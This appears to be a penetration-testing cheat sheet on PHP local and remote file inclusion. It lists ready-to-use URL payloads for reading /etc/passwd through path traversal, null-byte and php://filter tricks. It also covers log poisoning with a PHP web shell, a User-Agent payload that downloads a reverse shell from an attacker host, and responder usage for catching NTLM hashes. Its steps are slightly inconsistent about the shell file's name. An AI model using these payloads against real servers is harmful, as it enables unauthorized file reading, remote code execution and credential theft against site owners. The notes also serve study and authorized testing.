## Local file inclusion (LFI)

Basically occurs when a php web page take an other page to display in parameter.

***Example :***  
https://example.com/index.php?page=foo.php


#### Vulnerabilities
Vulnerabilities can be found using some parameter modifications

https://example.com/index.php?page=/etc/passwd
https://example.com/index.php?page=
https://example.com/index.php?page=./



### Filters

- Absolute path bypass
https://example.com/index.php?page=../../../../etc/passwd

- Extension bypass
https://example.com/index.php?page=../../../../etc/passwd%00

- Base64 bypass
https://example.com/index.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd  
https://example.com/index.php?page=php://filter/read=convert.base64-encode/resource=./../../etc/passwd  
https://example.com/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd  
https://example.com/index.php?page=php://filter/convert.base64-encode/resource=./../../etc/passwd  

## LFI2RCE / Log Poisonning

If the Apache or Nginx server is vulnerable to LFI inside the include function you could try to access to /var/log/apache2/access.log or /var/log/nginx/access.log, set inside the user agent or inside a GET parameter a php shell like `<?php system($_GET['c']); ?>` and include that file

## Remote file inclusion from log poisonning (RCE)
```php
User-Agent: <?php file_put_contents('/tmp/reverse_shell.php', file_get_contents('http://ATTAQUER_IP:ATTACKER_PORT/reverse_shell.php'))?>
```
Then go to /rev.php to start the reverse shell
In order to work, the php have to be in cleartext when it's read by the webpage  
e.g. if it appears in b64, nothing will work

# Remote file Inclusion

## Tools
- responder

### Responder

The `responder` utilisty can catch requests from many fake created servers such as `HTTP`  
This can sometimes leads to NTLM leaks

***Usage :***  
To start responder, you must select an interface 
```bash
responder -I INTERFACE_NAME
```